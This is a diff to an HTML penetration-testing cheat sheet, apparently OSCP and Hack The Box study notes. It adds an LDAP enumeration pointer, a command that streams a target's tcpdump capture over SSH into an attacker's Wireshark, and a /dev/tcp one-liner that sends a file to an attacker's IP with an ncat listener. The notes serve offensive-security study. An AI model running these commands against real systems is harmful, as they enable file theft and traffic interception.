@@ -336,7 +336,10 @@ Run "neo4j start" before importing the created zip file.
 
 Examples:
 HTB Reel - https://www.youtube.com/watch?v=ob9SgtFm6_g&t=2122s
-HTB Active - https://www.youtube.com/watch?v=jUc1J31DNdw&t=1105s	
+HTB Active - https://www.youtube.com/watch?v=jUc1J31DNdw&t=1105s
+
+#LDAP enumeration
+man ldapsearch	
 </pre>
 <hr>
 <p><h3>NTLM</h3></p>
@@ -457,7 +460,8 @@ fcrackzip -D -v -p [WORDLIST_FILE] [ZIP_FILE]
 <p><h3>Packet Sniffing</h3></p>
 <p><font size="3.5" color="black">Use Wireshark / tcpdump to capture traffic on the target host:</font></p>
 <pre style="background-color:black;color:white;">
-tcpdump -i tap0 host [IP_ADDRESS] tcp port 80 and not arp and not icmp -vv
+#Capture traffic via SSH and present it on attacker's wireshark without touching disk
+ssh [USER]@[TARGET_IP] "[TCPDUMP_PATH] -i [INTERFACE] -U -s0 -w - 'not port 22'" | wireshark -k -i -
 </pre>
 <hr>
 <p><h3>SSH</h3></p>
@@ -745,6 +749,7 @@ SMB - https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file
 python3 -m http.server [PORT]	#Simple HTTP request handler - very basic web server serving files relative to the current directory - In Arch
 python -m SimpleHTTPServer [PORT]	#In Kali
 php -S 127.0.0.1:8080	#HTTP request handler in php
+cat [FILE_2BE_MOVED] > /dev/tcp/[ATTACKER'S_IP]/[ATTACKER'S_PORT] 	#Don't forget to setup a listener: ncat -lvnp [ATTACKER'S_PORT] > [FILE_2BE_MOVED]
 </pre>
 <p><font size="3.5" color="black">- https://blog.ropnop.com/transferring-files-from-kali-to-windows/</font></p>
 <p><font size="3.5" color="black">- SecureCopy (scp) - http://www.hypexr.org/linux_scp_help.php</font></p>
